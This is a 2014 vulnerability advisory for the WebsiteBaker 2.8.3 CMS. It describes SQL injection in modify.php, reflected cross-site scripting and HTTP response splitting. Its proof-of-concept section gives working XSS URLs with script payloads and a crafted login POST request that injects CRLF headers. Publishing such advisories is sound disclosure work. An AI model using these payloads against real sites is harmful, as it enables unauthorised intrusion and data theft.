@@ -1,0 +1,111 @@
+=============================================
+MGC ALERT 2014-004
+- Original release date: March 11, 2014
+- Last revised:  November 18, 2014
+- Discovered by: Manuel Garcia Cardenas
+- Severity: 10/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Multiple Vulnerabilities in WebsiteBaker 2.8.3
+
+II. BACKGROUND
+-------------------------
+WebsiteBaker helps you to create the website you want: A free, easy and
+secure, flexible and extensible open source content management system (CMS).
+
+III. DESCRIPTION
+-------------------------
+It is possible to inject SQL code in the variable "id" on the page
+"modify.php". This bug was found using the portal without authentication.
+To exploit the vulnerability only is needed use the version 1.0 of the HTTP
+protocol to interact with the application.
+Has been detected a reflected XSS vulnerability in WebsiteBaker, that
+allows the execution of arbitrary HTML/script code to be executed in the
+context of the victim user's browser.
+An input validation problem exists within WebsiteBaker which allows
+injecting CR (carriage return - %0D or \r) and LF (line feed - %0A or \n)
+characters into the server HTTP response header, resulting in a HTTP
+Response Splitting Vulnerability.
+
+IV. PROOF OF CONCEPT
+-------------------------
+SQL Injection:
+
+/wb/admin/pages/modify.php?page_id=1
+
+Cross-Site Scripting GET:
+
+/wb/admin/admintools/tool.php?tool=captcha_control&6d442"><script>alert(1)</script>8e3b12642a8=1
+/wb/modules/edit_module_files.php?page_id=1&mod_dir=news&edit_file=frontend.css&action=edit&page_id=1&section_id=%007e393<script>alert(1)</script>9f8a40a7355f9acf0
+/wb/modules/news/add_post.php?page_id=1&section_id=f953a"><script>alert(1)</script>4ddf3369c1f
+/wb/modules/news/modify_group.php?page_id=1&section_id=%008cf03"><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3
+/wb/modules/news/modify_post.php?page_id=1&section_id=%003874a<script>alert(1)</script>4194d511605&post_id=db89943875a2db52
+/wb/modules/news/modify_settings.php?page_id=1&section_id=%008b2f4"><script>alert(1)</script>bdc8b3919b5
+
+HTTP RESPONSE SPLITTING:
+
+If you enter a valid user and password, you can inject on the headers
+malicious code, example.
+
+POST /wb/admin/login/index.php HTTP/1.1
+Content-Length: 204
+Content-Type: application/x-www-form-urlencoded
+Referer: http://192.168.244.129:80/wb/
+Host: 127.0.0.1
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/28.0.1500.63 Safari/537.36
+Accept: */*
+
+password_fieldname=password_nwh1uuwb&password_nwh1uuwb=VALIDPASS&remember=true&submit=Entrar&
+url=%0d%0a%20InjectedHeader:MaliciousCode&username_fieldname=username_nwh1uuwb&username_nwh1uuwb=adminResponse
+
+You can inject a new header named: InjectedHeader:MaliciousCode because we
+inject a CR&LF new line with %0d%0a%20.
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+WebsiteBaker <= 2.8.3
+
+VII. SOLUTION
+-------------------------
+No news releases
+
+VIII. REFERENCES
+-------------------------
+http://www.websitebaker.org
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel Garcia Cardenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+March 11, 2014 1: Initial release
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+March 11, 2014 1: Vulnerability acquired by Manuel Garcia Cardenas
+March 11, 2014 2: Send to vendor
+June 05, 2014 3: Second mail to the verdor without response
+November 18, 2014 4: Sent to lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
